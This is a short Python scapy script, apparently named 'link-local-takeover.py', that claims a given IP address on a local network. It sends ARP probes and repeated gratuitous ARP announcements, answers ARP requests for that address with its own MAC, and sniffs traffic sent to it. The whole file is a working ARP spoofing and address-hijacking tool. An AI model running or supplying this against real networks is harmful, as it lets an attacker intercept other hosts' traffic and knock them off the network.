import scapy.all as scapy
import sys
import time
import re 

ll_re = re.compile(r"^169\.254\.")
who=1
reply=2
iface_global = ""
ip_global = ""
mac_global = ""
def send_broadcast_request(ip):
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op = who, pdst = ip, hwdst = "00:00:00:00:00:00", psrc = "0.0.0.0")
    print("Sending packet:")
    print(scapy.ls(pkt))
    scapy.sendp(pkt, verbose = True,  iface=iface_global)
def send_broadcast_announce(ip):
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op = who, pdst = ip, hwdst = "00:00:00:00:00:00", psrc = ip)
    print("Sending packet:")
    print(scapy.ls(pkt))
    scapy.sendp(pkt, verbose = True,  iface=iface_global)
def send_reply(ip,  mac):
    pkt = scapy.Ether(dst=mac)/scapy.ARP(op = reply, pdst = ip, hwdst = mac, psrc = ip_global)
    print("Sending packet:")
    print(scapy.ls(pkt))
    scapy.sendp(pkt, verbose = True,  iface=iface_global)
def handle_new_packet(pkt):
    print("received new packet")
    print(scapy.ls(pkt))
    return
def handle_arp_packet(pkt):
    print("ARP!")
    if pkt[scapy.ARP].op == who and pkt[scapy.ARP].pdst == ip_global and pkt[scapy.Ether].src != mac_global:
        print(scapy.ls(pkt))
        print("Got ARP request. Sending reply")
        send_reply(pkt[scapy.ARP].psrc, pkt[scapy.Ether].src)
    
    return

if len(sys.argv) == 3:
    iface_global = sys.argv[1]
    ip= sys.argv[2]
    ip_global = ip
    mac_global = scapy.get_if_hwaddr(iface_global)
    s_arp = scapy.AsyncSniffer(filter="arp",  iface=iface_global,  prn=handle_arp_packet)
    s_arp.start()
    send_broadcast_request(ip)
    send_broadcast_request(ip)
    send_broadcast_request(ip)
    send_broadcast_announce(ip)
    send_broadcast_announce(ip)
    send_broadcast_announce(ip)
    time.sleep(4)
    s = scapy.AsyncSniffer(filter="dst host %s" % ip, iface=iface_global,  prn=handle_new_packet) #Requires scapy >= 2..4.3
    s.start()
    false = True #Just to bug you...
    while(false):
        try:
            time.sleep(5)
            send_broadcast_announce(ip)
        except KeyboardInterrupt:
            s.stop()
            s_arp.stop()
            sys.exit(0)

else:
    print("Usage: link-local-takeover.py <iface> <ip>")
